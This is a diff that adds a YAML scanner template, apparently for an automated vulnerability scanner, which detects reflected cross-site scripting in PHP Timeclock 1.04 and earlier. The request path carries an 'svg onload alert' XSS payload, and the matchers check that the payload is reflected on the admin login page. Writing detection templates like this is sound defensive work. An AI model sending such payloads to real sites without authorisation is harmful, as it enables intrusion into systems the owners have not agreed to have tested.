@@ -1,0 +1,37 @@
+id: "php-timeclock-xss"
+name: "PHP Timeclock <=1.04 - Cross-Site Scripting"
+severity: "high"
+description: "PHP Timeclock 1.04 and prior contains multiple cross-site scripting vulnerabilities via login.php, timeclock.php, reports/audit.php. and reports/timerpt.php"
+tech:
+  - "php"
+tags:
+  - "xss"
+  - "php"
+  - "timeclock"
+  - "edb"
+  - "intrusive"
+  - "vuln"
+cwe: "CWE-79"
+reference: "https://www.exploit-db.com/exploits/49853"
+spaExclusion: true
+request:
+  method: "GET"
+  path: "/login.php/'%3E%3Csvg/onload=alert%60{{rand}}%60%3E"
+control:
+  method: "GET"
+  path: "/.guardian-none-{{rand}}"
+matchers-condition: "and"
+matchers:
+  - type: "status"
+    status:
+      - 200
+  - type: "word"
+    part: "body"
+    words:
+      - "<svg/onload=alert`{{randstr}}`>"
+      - "PHP Timeclock Admin Login"
+    condition: "and"
+  - type: "word"
+    part: "header"
+    words:
+      - "text/html"
